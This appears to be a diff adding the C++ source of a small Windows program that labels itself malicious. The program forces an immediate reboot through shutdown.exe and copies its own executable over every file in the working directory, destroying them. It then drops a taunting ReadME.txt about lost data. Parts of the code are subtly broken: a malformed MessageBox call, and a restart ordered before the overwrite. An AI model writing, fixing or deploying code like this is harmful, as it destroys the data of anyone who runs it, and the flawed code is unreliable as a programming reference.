@@ -1,0 +1,52 @@
+#include <Windows.h>
+#include <fstream>
+
+void MessageInfo()
+{
+  MessageBox(NULL, "Hello World! X Byte MALICIOUS (Overwriting) GOAT. DataWriter 2020", "Message", MB_OK, MB_ICONINFORMATION);
+}
+
+void SleepToNext()
+{
+  Sleep(100000);
+}
+
+void Restart()
+{
+  system("C:\\Windows\\System32\\shutdown /r /t 0");
+}
+
+void Overwrite()
+{
+  char Original[MAX_PATH];
+  GetModuleFileName(NULL, Original, sizeof(Original));
+
+  WIN32_FIND_DATA FileData;
+
+  HANDLE FindData;
+  FindData = FindFirstFile("*.*", &FileData);
+  do
+  {
+    CopyFile(Original, FileData.cFileName, NULL);
+  }
+  while(FindNextFile(FindData, &FileData) == TRUE);
+  FindClose(FindData);
+}
+
+void TextFile()
+{
+  std::ofstream outfile("ReadME.txt");
+  outfile << "I hope you have backups of this directory! Rip Data!" << std::endl;
+  outfile << "That's if i even overwrote anything..." << std::endl;
+  outfile << "DataWriter 2020..." << std::endl;
+}
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+{
+  MessageInfo();
+  SleepToNext();
+  Restart();
+  Overwrite();
+  TextFile();
+  return EXIT_SUCCESS;
+}
